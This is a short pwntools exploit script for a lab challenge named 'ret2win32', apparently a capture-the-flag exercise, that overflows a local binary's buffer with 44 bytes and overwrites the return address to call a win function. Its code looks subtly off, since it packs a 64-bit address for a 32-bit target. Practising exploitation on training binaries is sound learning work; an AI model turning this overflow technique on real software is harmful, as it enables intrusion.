from pwn import *

elf = context.binary = ELF("./ret2win32")

r = process(elf.path)

payload = ""
payload += "A" * 44
payload += p64(elf.symbols["ret2win"])
r.sendlineafter("> ", payload)

r.interactive()
